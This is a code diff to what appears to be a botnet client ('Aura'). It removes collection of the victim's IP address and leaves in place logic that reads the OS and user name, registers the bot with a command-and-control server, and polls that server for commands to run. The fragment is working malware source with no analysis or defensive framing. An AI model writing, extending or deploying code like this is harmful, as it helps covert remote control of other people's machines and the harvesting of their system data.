@@ -99,7 +99,7 @@ class Bot {
     bool isInit();
 
    private:
-    std::string _hashType, _hashSum, _os, _user, _ipAddr;
+    std::string _hashType, _hashSum, _os, _user;
     std::unique_ptr<Seed> _seed;
     std::unique_ptr<C2Server> _c2Server;
 
@@ -123,7 +123,6 @@ void Bot::executeOrder() {
     request::PostForm postForm;
     postForm.addField("version", AURA_VERSION);
     postForm.addField("hash_sum", _hashSum);
-    postForm.addField("ip_addr", _ipAddr);
 
     std::string cmd =
         request::post(_c2Server->getCmdUrl(), postForm.toString());
@@ -148,9 +147,6 @@ void Bot::_prepareSysInfo() {
     if (!(_user.size())) {
         _user = util::getUser();
     }
-    if (!(_ipAddr.size())) {
-        _ipAddr = util::getIPAddr();
-    }
 }
 
 void Bot::_registerBot() {
@@ -162,6 +158,5 @@ void Bot::_registerBot() {
     postForm.addField("hash_sum", _hashSum);
     postForm.addField("operating_sys", _os);
     postForm.addField("user", _user);
-    postForm.addField("ip_addr", _ipAddr);
     request::post(_c2Server->getRegisterUrl(), postForm.toString());
 }
